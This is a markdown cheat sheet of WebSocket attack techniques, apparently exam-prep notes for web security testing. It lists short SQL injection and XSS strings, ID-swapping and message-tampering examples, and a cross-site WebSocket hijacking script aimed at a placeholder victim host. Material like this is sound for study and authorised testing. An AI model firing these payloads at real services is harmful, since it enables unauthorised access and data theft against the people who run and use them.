

---

``md
> [!ABSTRACT]
> WebSockets are a protocol that enables **persistent, two-way communication** between a client and server.  
> 
> Unlike HTTP:
> - Connection stays open  
> - Messages are sent continuously in real-time  
> 
> Vulnerabilities arise when:
> - Messages are not validated  
> - Authentication/authorization is weak  
> - Origin checks are missing  
> 
> Common issues:
> - Cross-Site WebSocket Hijacking (CSWSH)  
> - Injection attacks (SQLi, XSS, etc.)  
> - Broken access control  
> 
> Impact:
> - Unauthorized actions  
> - Data leakage  
> - Full account compromise  
> 
> 🧠 Think: “You’re sending raw messages directly to backend logic” :contentReference[oaicite:0]{index=0}

---

## 🧠 WebSockets – Cheat Sheet

---

### 🎯 1. Basic Detection (Find WebSocket)

> [!CHECK]
> Identify WebSocket connection in app  
> Look for `ws://` or `wss://`  

```http
GET /chat HTTP/1.1
Upgrade: websocket
````

---

### 🧪 2. Intercept & Modify Messages

> [!CHECK]  
> Intercept messages and modify parameters

```json
{"message":"hello"}
```

---

### 🧬 3. IDOR via WebSocket

> [!SUCCESS]  
> Change IDs inside messages

```json
{"userId":"123"}
```

```json
{"userId":"124"}
```

---

### 🧩 4. Message Manipulation

> [!SUCCESS]  
> Modify actions sent via WebSocket

```json
{"action":"deleteUser","user":"carlos"}
```

---

### 🧪 5. Authentication Bypass

> [!ATTENTION]  
> Test if connection works without auth

```json
{"action":"getData"}
```

---

### 💥 6. Cross-Site WebSocket Hijacking (CSWSH)

> [!SUCCESS]  
> Exploit when cookies used for auth and no origin check

```html
<script>
var ws = new WebSocket("wss://victim.com/ws");
ws.onopen = function() {
  ws.send(JSON.stringify({"action":"getData"}));
};
</script>
```

---

### ⚙️ 7. Injection via WebSocket

> [!ATTENTION]  
> Test for SQLi / XSS inside messages

```json
{"search":"' OR 1=1--"}
```

```json
{"message":"<script>alert(1)</script>"}
```

---

### 🧪 8. Replay Attack

> [!SUCCESS]  
> Replay previously captured messages

```json
{"action":"transfer","amount":"100"}
```

---

### 💣 9. DoS via WebSocket

> [!DANGER]  
> Flood server with messages

```bash
send message repeatedly
send message repeatedly
send message repeatedly
```

---

### 🔍 10. Real Workflow (Operator Method)

> [!SUCCESS]

1. Find WebSocket connection
    
2. Intercept message:
    

```json
{"message":"test"}
```

3. Modify parameters:
    

```json
{"userId":"124"}
```

4. Test auth:
    

```json
{"action":"getData"}
```

5. Try injection:
    

```json
{"search":"' OR 1=1--"}
```

---

### 🧠 11. Where to Test

> [!ABSTRACT]

- Chat systems
    
- Notifications
    
- Live updates
    
- Trading apps
    
- Real-time dashboards
    

---

## 🔥 Minimal Payload Set (EXAM USE)

> [!SUCCESS]  
> If you remember nothing else

```bash
{"userId":"124"}
{"action":"deleteUser"}
{"search":"' OR 1=1--"}
{"message":"<script>alert(1)</script>"}
```

---

## ⚠️ Operator Notes

> [!FAILURE]  
> If nothing happens:
> 
> - Strong validation
>     
> - Proper auth checks
>     
> - Secure origin verification
>     

---

> [!ATTENTION]  
> WebSockets are just another input vector
> 
> Anything possible in HTTP (XSS, SQLi, IDOR)  
> 👉 is also possible in WebSockets

---

```

---

## 🔥 Key Insight (important for you)

- WebSockets = **hidden attack surface**
- Many people ignore it → **easy bugs**
- Always think:
  - “Can I modify this message?”
  - “Is auth enforced per message?”

---

::contentReference[oaicite:1]{index=1}
```